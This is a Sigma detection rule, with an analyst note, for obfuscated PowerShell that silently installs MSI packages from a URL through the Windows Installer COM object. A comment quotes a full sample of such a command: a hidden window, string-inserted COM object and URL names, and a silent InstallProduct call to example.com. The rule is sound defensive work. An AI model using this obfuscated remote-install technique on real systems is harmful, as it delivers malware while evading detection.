logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
    - '.Insert('
    - 'UILevel'
  condition: all of selection_*
falsepositives:
- Unknown
level: high
note: |
  ---

  ### Technical Context

  This Sigma rule detects the execution of obfuscated PowerShell commands that utilize the Windows Installer COM object to install MSI packages. Attackers often employ such obfuscation to hide malicious activities from defensive tools. The primary intent is to deploy malware that may not be easily detected during static analysis or traditional execution methods.

  The relevant MITRE ATT&CK tactics for this behavior include *Execution* (T1059.001 – Command and Scripting Interpreter: Windows PowerShell) and *Defense Evasion* (T1027.010 – Obfuscated Files or Information). The primary telemetry sources include Windows process creation logs (Security Event ID 4688 or Sysmon Event ID 1), which will show the PowerShell execution and command lines being utilized. A successful exploit can lead to unauthorized software installations with potential system compromise.

  It's important to note that while this detection raises an alert for potentially malicious activity, it does not confirm that the installation was successful or that the installed application is inherently harmful.

  ---

  ### Investigation Steps

  - **Review the Command Line Arguments:** Check for `CommandLine` values in Event ID 4688 or Sysmon Event ID 1 for PowerShell execution that contains `-ComObject`, `InstallProduct(`, `.Insert(`, and `UILevel`. Any instance of these patterns in combination is a strong indicator of potential malicious intent.

  - **Validate PowerShell Process Execution:** Verify the originating images for the PowerShell process. Focus on instances where `Image` ends with `\powershell.exe`, `\powershell_ise.exe`, or `\pwsh.exe`, and ensure the `OriginalFileName` matches known PowerShell executables — deviations could suggest obfuscation.

  - **Correlate with Network Activity:** Identify any external requests tied to the command, especially those contacting obfuscated URLs. Look into firewall logs for outbound connections initiated by the PowerShell process that correspond to suspicious domains (e.g., `htps://` variations).

  - **Examine User Context:** Check which account executed the PowerShell command and confirm the user's role. Legitimate administrative tasks may utilize PowerShell and the Windows Installer, but unusual accounts or system contexts executing this may warrant closer scrutiny.

  - **Assess UI Suppression:** Determine if the PowerShell command was executed with UI suppression (e.g., `-WindowStyle Hidden`). This is often abused in automated malicious installations where user interaction is not intended.

  - **Look for File Artifacts Post-Execution:** After a potential installation, investigate `C:\ProgramData\Microsoft\Windows\Start Menu\Programs` or `C:\Program Files` folder for newly created files matching MSI installations or unusual program entries. Track activity around creation timestamps in relevant registry keys.

  ---

  ### Prioritization

  The alert severity is high due to the potential impact on critical systems from unauthorized software installations. The likelihood of this behavior being weaponized is significant, as attackers frequently employ obfuscation techniques to evade detection. Compromised systems may lead to further exploitation and data breaches.

  ---

  ### Blind Spots and Assumptions

  Detection limitations include the possibility of benign scripts that legitimately use obfuscated commands or the Windows Installer. Additionally, required Windows logs must be properly configured (i.e., enabling process auditing) for comprehensive coverage. Legitimate administrative actions involving software installations through PowerShell may also trigger this alert, necessitating contextual review. A related detection for searching known MSDT exploits or script execution in PowerShell could complement this coverage.

